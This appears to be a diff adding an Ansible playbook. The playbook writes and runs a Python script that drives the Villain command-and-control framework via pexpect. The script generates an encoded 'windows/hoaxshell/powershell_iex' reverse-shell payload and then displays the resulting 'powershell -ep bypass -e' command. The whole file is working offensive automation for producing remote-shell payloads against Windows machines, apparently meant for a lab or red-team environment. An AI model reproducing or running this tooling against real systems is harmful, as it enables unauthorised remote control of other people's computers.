@@ -1,1 +1,31 @@
+---
+- name: Villain
+  copy:
+    dest: /opt/generate_payload.py
+    content: |
+      import pexpect
+      import re
+      villain_prompt = '\x1b[4mVillain\x1b[0m > '
+      child = pexpect.spawn('villain -q', encoding='utf-8', timeout=20)
+      child.expect(re.escape(villain_prompt))
+      child.sendline('generate payload=windows/hoaxshell/powershell_iex lhost=eth0 encode')
+      child.expect(re.escape(villain_prompt))
+      payload = child.before
+      pattern = r"powershell -ep bypass -e ([A-Za-z0-9+/=]+)"
+      match = re.search(pattern, payload)
+      command = match.group(0)
+      print(command)
 
+- name: Make the script executable
+  file:
+    path: /opt/generate_payload.py
+    mode: '0755'
+
+
+- name: Run the Villain
+  shell: python3 /opt/generate_payload.py
+  register: villain_output
+
+- name: Display the payload
+  debug:
+    msg: "{{ villain_output.stdout }}"
